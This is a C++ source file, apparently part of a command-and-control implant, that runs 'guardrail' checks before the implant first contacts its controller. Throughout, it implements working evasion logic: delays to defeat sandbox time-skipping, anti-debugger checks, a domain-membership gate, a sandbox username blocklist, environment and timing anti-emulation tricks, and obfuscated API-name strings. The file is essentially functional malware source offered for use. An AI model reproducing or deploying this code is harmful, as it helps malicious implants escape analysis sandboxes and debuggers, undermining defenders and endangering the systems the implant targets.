// guardrails.cc - Pre-flight environment checks before first C2 contact.
// Each check is gated by its own #ifdef so disabled checks compile to nothing.
// All Win32 APIs resolved locally via LoadLibraryA + GetProcAddress (no INSTANCE
// struct pollution). String literals obfuscated with xstr()/XSTR() macros.

#include "config.h"
#include "common.h"
#include "evasion/guardrails.h"

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

// Case-insensitive substring search (PIC-safe, no CRT)
static BOOL es_contains_ci(const char* haystack, int haystack_len,
                           const char* needle, int needle_len) {
    if (needle_len == 0 || haystack_len < needle_len) return FALSE;
    for (int i = 0; i + needle_len <= haystack_len; i++) {
        BOOL match = TRUE;
        for (int j = 0; j < needle_len; j++) {
            char a = haystack[i + j];
            char b = needle[j];
            // tolower without CRT
            if (a >= 'A' && a <= 'Z') a += 0x20;
            if (b >= 'A' && b <= 'Z') b += 0x20;
            if (a != b) { match = FALSE; break; }
        }
        if (match) return TRUE;
    }
    return FALSE;
}

// ---------------------------------------------------------------------------
// 1. Pre-sleep delay
// ---------------------------------------------------------------------------
#ifdef INCLUDE_GUARDRAIL_PRE_SLEEP
static void gr_pre_sleep(PINSTANCE inst) {
    if (inst->Config.pre_sleep_seconds == 0) return;
    // Simple native delay. Use Sleep from the already-resolved Win32 table.
    inst->Win32.Sleep(inst->Config.pre_sleep_seconds * 1000);
}
#endif

// ---------------------------------------------------------------------------
// 2. Computational delay (Fibonacci QPC-timed loop, defeats sandbox fast-forward)
// ---------------------------------------------------------------------------
#ifdef INCLUDE_GUARDRAIL_COMPUTATIONAL_DELAY
typedef BOOL (WINAPI *fnQueryPerformanceFrequency)(LARGE_INTEGER*);
typedef BOOL (WINAPI *fnQueryPerformanceCounter)(LARGE_INTEGER*);

static void gr_computational_delay(PINSTANCE inst, DWORD milliseconds) {
    if (milliseconds == 0) return;

    xstr(_qpf, "QueryPerformanceFrequency");
    xstr(_qpc, "QueryPerformanceCounter");
    fnQueryPerformanceFrequency pQPF = (fnQueryPerformanceFrequency)
        inst->Win32.GetProcAddress((HMODULE)inst->Modules.Kernel32, _qpf);
    fnQueryPerformanceCounter pQPC = (fnQueryPerformanceCounter)
        inst->Win32.GetProcAddress((HMODULE)inst->Modules.Kernel32, _qpc);

    LARGE_INTEGER frequency = {0};
    LARGE_INTEGER start = {0}, stop = {0};

    if (!pQPF || !pQPC || !pQPF(&frequency) || frequency.QuadPart == 0) {
        // Fallback: plain sleep if QPC not available
        inst->Win32.Sleep(milliseconds);
        return;
    }

    pQPC(&start);

    // Fibonacci computation loop -- real CPU work that cannot be fast-forwarded
    ULONGLONG fib_a = 0, fib_b = 1;
    ULONGLONG steps = 0;
    while (TRUE) {
        ULONGLONG fib = fib_a + fib_b;
        fib_a = fib_b;
        fib_b = fib;
        steps++;

        // Check elapsed time every 65536 iterations to avoid QPC overhead
        if ((steps & 0xFFFF) == 0) {
            pQPC(&stop);
            double elapsed = (double)(stop.QuadPart - start.QuadPart) * 1000.0
                           / (double)frequency.QuadPart;
            if (elapsed >= (double)milliseconds) break;
        }

        // Overflow wrap: reset the sequence
        if (fib < fib_a) {
            fib_a = 0;
            fib_b = 1;
        }
    }
}
#endif

// ---------------------------------------------------------------------------
// 3. Anti-debug (PEB + NtQueryInformationProcess)
// ---------------------------------------------------------------------------
#ifdef INCLUDE_GUARDRAIL_ANTI_DEBUG
typedef NTSTATUS (NTAPI *fnNtQueryInformationProcess)(
    HANDLE, ULONG, PVOID, ULONG, PULONG);

static BOOL gr_anti_debug(PINSTANCE inst) {
    // Check PEB->BeingDebugged via TEB
#if defined(_WIN64) || defined(__x86_64__)
    PPEB_FULL peb = (PPEB_FULL)__readgsqword(0x60);
#else
    PPEB_FULL peb = (PPEB_FULL)__readfsdword(0x30);
#endif
    if (peb->BeingDebugged) return FALSE;

    // NtQueryInformationProcess: ProcessDebugPort (7) and ProcessDebugObjectHandle (0x1E)
    xstr(_nqip, "NtQueryInformationProcess");
    fnNtQueryInformationProcess pNQIP = (fnNtQueryInformationProcess)
        inst->Win32.GetProcAddress((HMODULE)inst->Modules.Ntdll, _nqip);
    if (!pNQIP) return TRUE;  // can't check, assume clean

    HANDLE hProc = inst->Win32.GetCurrentProcess();
    ULONG_PTR debug_port = 0;
    ULONG ret_len = 0;

    // ProcessDebugPort (class 7): non-zero means debugger attached
    NTSTATUS st = pNQIP(hProc, 7, &debug_port, sizeof(debug_port), &ret_len);
    if (st == 0 && debug_port != 0) return FALSE;

    // ProcessDebugObjectHandle (class 0x1E): non-zero means debug object exists
    ULONG_PTR debug_object = 0;
    st = pNQIP(hProc, 0x1E, &debug_object, sizeof(debug_object), &ret_len);
    if (st == 0 && debug_object != 0) return FALSE;

    return TRUE;
}
#endif

// ---------------------------------------------------------------------------
// 4. Domain-joined check (NetGetJoinInformation)
// ---------------------------------------------------------------------------
#ifdef INCLUDE_GUARDRAIL_DOMAIN_JOINED
typedef DWORD (WINAPI *fnNetGetJoinInformation)(LPCWSTR, LPWSTR*, DWORD*);
typedef DWORD (WINAPI *fnNetApiBufferFree)(LPVOID);

static BOOL gr_domain_joined(PINSTANCE inst) {
    xstr(_netapi, "netapi32.dll");
    HMODULE hNet = inst->Win32.LoadLibraryA(_netapi);
    if (!hNet) return FALSE;

    xstr(_ngji, "NetGetJoinInformation");
    xstr(_nabf, "NetApiBufferFree");
    fnNetGetJoinInformation pNGJI = (fnNetGetJoinInformation)
        inst->Win32.GetProcAddress(hNet, _ngji);
    fnNetApiBufferFree pNABF = (fnNetApiBufferFree)
        inst->Win32.GetProcAddress(hNet, _nabf);
    if (!pNGJI) return FALSE;

    LPWSTR name = NULL;
    DWORD status = 0;
    DWORD rc = pNGJI(NULL, &name, &status);
    if (name && pNABF) pNABF(name);

    // NetSetupDomainName == 3: machine is joined to a domain
    return (rc == 0 && status == 3);
}
#endif

// ---------------------------------------------------------------------------
// 5. Anti-sandbox (uptime, screen, username blocklist, file checks)
// ---------------------------------------------------------------------------
#ifdef INCLUDE_GUARDRAIL_ANTI_SANDBOX

typedef BOOL (WINAPI *fnQueryUnbiasedInterruptTime)(PULONGLONG);
typedef int  (WINAPI *fnGetSystemMetrics)(int);
typedef BOOL (WINAPI *fnGetUserNameA)(LPSTR, LPDWORD);
typedef BOOL (WINAPI *fnGetComputerNameA)(LPSTR, LPDWORD);

static BOOL gr_anti_uptime(PINSTANCE inst) {
    xstr(_quit, "QueryUnbiasedInterruptTime");
    fnQueryUnbiasedInterruptTime pQUIT = (fnQueryUnbiasedInterruptTime)
        inst->Win32.GetProcAddress((HMODULE)inst->Modules.Kernel32, _quit);
    if (!pQUIT) return TRUE;  // can't check, assume ok

    ULONGLONG unbiased = 0;
    if (!pQUIT(&unbiased)) return TRUE;

    // Units: 100ns ticks -> minutes
    ULONGLONG minutes = unbiased / 10000000ULL / 60ULL;
    return (minutes >= 30);
}

static BOOL gr_anti_screen(PINSTANCE inst) {
    xstr(_user32, "user32.dll");
    HMODULE hU32 = inst->Win32.LoadLibraryA(_user32);
    if (!hU32) return TRUE;

    xstr(_gsm, "GetSystemMetrics");
    fnGetSystemMetrics pGSM = (fnGetSystemMetrics)
        inst->Win32.GetProcAddress(hU32, _gsm);
    if (!pGSM) return TRUE;

    // SM_CXSCREEN == 0, SM_CYSCREEN == 1
    return (pGSM(0) >= 1024 && pGSM(1) >= 768);
}

static BOOL gr_anti_username(PINSTANCE inst) {
    xstr(_guna, "GetUserNameA");
    xstr(_gcna, "GetComputerNameA");
    fnGetUserNameA pGUN = (fnGetUserNameA)
        inst->Win32.GetProcAddress((HMODULE)inst->Modules.Kernel32, _guna);
    fnGetComputerNameA pGCN = (fnGetComputerNameA)
        inst->Win32.GetProcAddress((HMODULE)inst->Modules.Kernel32, _gcna);

    char user[256]; es_memset(user, 0, sizeof(user));
    DWORD user_len = sizeof(user);
    if (pGUN) pGUN(user, &user_len);

    char computer[256]; es_memset(computer, 0, sizeof(computer));
    DWORD comp_len = sizeof(computer);
    if (pGCN) pGCN(computer, &comp_len);

    int ulen = es_strlen(user);
    int clen = es_strlen(computer);

    // Blocklist: common sandbox/analysis usernames and machine names.
    // Check each one individually to avoid XSTR() lifetime issues in arrays.
    struct { const char* s; int len; } blocked_items[8];

    xstr(_bl0, "wdagutilityaccount"); blocked_items[0] = { _bl0, 18 };
    xstr(_bl1, "sandbox");            blocked_items[1] = { _bl1, 7 };
    xstr(_bl2, "cuckoo");             blocked_items[2] = { _bl2, 6 };
    xstr(_bl3, "malware");            blocked_items[3] = { _bl3, 7 };
    xstr(_bl4, "maltest");            blocked_items[4] = { _bl4, 7 };
    xstr(_bl5, "tequilaboom");        blocked_items[5] = { _bl5, 11 };
    xstr(_bl6, "infected");           blocked_items[6] = { _bl6, 8 };
    xstr(_bl7, "virus");              blocked_items[7] = { _bl7, 5 };

    for (int i = 0; i < 8; i++) {
        if (es_contains_ci(user, ulen, blocked_items[i].s, blocked_items[i].len))
            return FALSE;
        if (es_contains_ci(computer, clen, blocked_items[i].s, blocked_items[i].len))
            return FALSE;
    }
    return TRUE;
}

static BOOL gr_anti_file_checks(PINSTANCE inst) {
    // kernel32.dll must exist (GetFileAttributesA is already resolved)
    xstr(_k32path, "C:\\Windows\\System32\\kernel32.dll");
    if (inst->Win32.GetFileAttributesA(_k32path) == INVALID_FILE_ATTRIBUTES)
        return FALSE;

    // win.ini must be readable and start with '; f' (or '; F')
    xstr(_winini, "C:\\Windows\\win.ini");
    HANDLE hFile = inst->Win32.CreateFileA(
        _winini, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    char buf[4]; es_memset(buf, 0, 4);
    DWORD bytes_read = 0;
    BOOL ok = inst->Win32.ReadFile(hFile, buf, 4, &bytes_read, NULL);
    inst->Win32.CloseHandle(hFile);

    if (!ok || bytes_read < 4) return FALSE;
    return (buf[0] == ';' && buf[1] == ' ' &&
            (buf[2] == 'f' || buf[2] == 'F'));
}

static BOOL gr_anti_sandbox(PINSTANCE inst) {
    return gr_anti_uptime(inst) &&
           gr_anti_screen(inst) &&
           gr_anti_username(inst) &&
           gr_anti_file_checks(inst);
}
#endif

// ---------------------------------------------------------------------------
// 6. Anti-emulation (timing, failed API calls, env, NUMA, CPU burn, large alloc)
// ---------------------------------------------------------------------------
#ifdef INCLUDE_GUARDRAIL_ANTI_EMULATION

typedef ULONGLONG (WINAPI *fnGetTickCount64)(VOID);
typedef BOOL (WINAPI *fnGetUserNameA_)(LPSTR, LPDWORD);
typedef DWORD (WINAPI *fnExpandEnvironmentStringsA)(LPCSTR, LPSTR, DWORD);
typedef LPVOID (WINAPI *fnVirtualAllocExNuma)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD, DWORD);

// Timing: Sleep 2500ms, verify wall clock advanced at least 2200ms.
// Sandboxes that fast-forward Sleep() will fail this delta check.
static BOOL gr_anti_timing(PINSTANCE inst) {
    xstr(_gtc, "GetTickCount64");
    fnGetTickCount64 pGTC = (fnGetTickCount64)
        inst->Win32.GetProcAddress((HMODULE)inst->Modules.Kernel32, _gtc);
    if (!pGTC) return TRUE;

    ULONGLONG start = pGTC();
    inst->Win32.Sleep(2500);
    ULONGLONG elapsed = pGTC() - start;
    return (elapsed >= 2200);
}

// Hammer CloseHandle with bogus handles 1M times.
// Real Windows silently fails; emulators may bail or mismatch the counter.
static BOOL gr_anti_failed_call(PINSTANCE inst) {
    LONG counter = 0;
    for (LONG i = 0; i < 1000000; i++) {
        HANDLE bogus = (HANDLE)(ULONG_PTR)(0xF0000000ULL + (i & 0xFF));
        inst->Win32.CloseHandle(bogus);
        counter++;
    }
    return (counter != 0);
}

// Environment consistency: GetUserNameA must match %USERNAME%, %OS% must be
// "Windows_NT", %PUBLIC% must be "C:\Users\Public".
static BOOL gr_anti_env(PINSTANCE inst) {
    xstr(_guna2, "GetUserNameA");
    fnGetUserNameA_ pGUN = (fnGetUserNameA_)
        inst->Win32.GetProcAddress((HMODULE)inst->Modules.Kernel32, _guna2);

    xstr(_eesa, "ExpandEnvironmentStringsA");
    fnExpandEnvironmentStringsA pEES = (fnExpandEnvironmentStringsA)
        inst->Win32.GetProcAddress((HMODULE)inst->Modules.Kernel32, _eesa);

    if (!pGUN || !pEES) return TRUE;

    // Get real username
    char user[256]; es_memset(user, 0, sizeof(user));
    DWORD user_len = sizeof(user);
    pGUN(user, &user_len);
    if (user[0] == 0) return TRUE;  // can't determine, assume ok

    // Compare with %USERNAME% expansion
    char expanded[256]; es_memset(expanded, 0, sizeof(expanded));
    xstr(_env_user, "%USERNAME%");
    pEES(_env_user, expanded, sizeof(expanded));
    if (es_strcmp(user, expanded) != 0) return FALSE;

    // %OS% must be "Windows_NT"
    char os_val[256]; es_memset(os_val, 0, sizeof(os_val));
    xstr(_env_os, "%OS%");
    pEES(_env_os, os_val, sizeof(os_val));
    xstr(_win_nt, "Windows_NT");
    if (es_strcmp(os_val, _win_nt) != 0) return FALSE;

    // %PUBLIC% must be "C:\Users\Public"
    char pub_val[256]; es_memset(pub_val, 0, sizeof(pub_val));
    xstr(_env_pub, "%PUBLIC%");
    pEES(_env_pub, pub_val, sizeof(pub_val));
    xstr(_pub_path, "C:\\Users\\Public");
    if (es_strcmp(pub_val, _pub_path) != 0) return FALSE;

    return TRUE;
}

// NUMA allocation: VirtualAllocExNuma must succeed on the real OS.
// Lightweight emulators often don't implement NUMA-aware allocation.
static BOOL gr_anti_winapi(PINSTANCE inst) {
    xstr(_vaen, "VirtualAllocExNuma");
    fnVirtualAllocExNuma pVAEN = (fnVirtualAllocExNuma)
        inst->Win32.GetProcAddress((HMODULE)inst->Modules.Kernel32, _vaen);
    if (!pVAEN) return TRUE;

    LPVOID mem = pVAEN(
        inst->Win32.GetCurrentProcess(),
        NULL, 0x1000,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_READWRITE, 0);
    if (!mem) return FALSE;
    inst->Win32.VirtualFree(mem, 0, MEM_RELEASE);
    return TRUE;
}

// CPU burn: 100M iterations of integer math. Defeats sandbox timeouts and
// ensures the CPU actually performs work (emulators may skip or timeout).
static BOOL gr_anti_billion_steps(void) {
    volatile LONGLONG counter = 0;
    for (LONGLONG i = 0; i < 100000000LL; i++) {
        counter += (i % 3) - (i % 5);
        counter ^= (i << 1);
        counter *= ((i % 2) == 0) ? -1 : 1;
    }
    return (counter != 0);
}

// Large allocation: 256MB commit + touch every page. Real OS handles this;
// sandboxes with limited RAM or memory hooks will fail.
static BOOL gr_anti_large_alloc(PINSTANCE inst) {
    SIZE_T size = 256 * 1024 * 1024;  // 256MB
    LPVOID mem = inst->Win32.VirtualAlloc(
        NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return FALSE;

    // Touch every page so the OS must actually commit physical memory
    BYTE* bytes = (BYTE*)mem;
    for (SIZE_T offset = 0; offset < size; offset += 4096)
        bytes[offset] = 0x41;

    inst->Win32.VirtualFree(mem, 0, MEM_RELEASE);
    return TRUE;
}

static BOOL gr_anti_emulation(PINSTANCE inst) {
    return gr_anti_timing(inst) &&
           gr_anti_failed_call(inst) &&
           gr_anti_env(inst) &&
           gr_anti_winapi(inst) &&
           gr_anti_billion_steps() &&
           gr_anti_large_alloc(inst);
}
#endif

// ---------------------------------------------------------------------------
// Master guardrails gate
// ---------------------------------------------------------------------------
BOOL guardrails_check(PINSTANCE inst) {
#ifdef INCLUDE_GUARDRAIL_PRE_SLEEP
    gr_pre_sleep(inst);
#endif

#ifdef INCLUDE_GUARDRAIL_COMPUTATIONAL_DELAY
    gr_computational_delay(inst, 3000);
#endif

#ifdef INCLUDE_GUARDRAIL_ANTI_DEBUG
    if (!gr_anti_debug(inst)) return FALSE;
#endif

#ifdef INCLUDE_GUARDRAIL_DOMAIN_JOINED
    if (!gr_domain_joined(inst)) return FALSE;
#endif

#ifdef INCLUDE_GUARDRAIL_ANTI_SANDBOX
    if (!gr_anti_sandbox(inst)) return FALSE;
#endif

#ifdef INCLUDE_GUARDRAIL_ANTI_EMULATION
    if (!gr_anti_emulation(inst)) return FALSE;
#endif

    return TRUE;
}
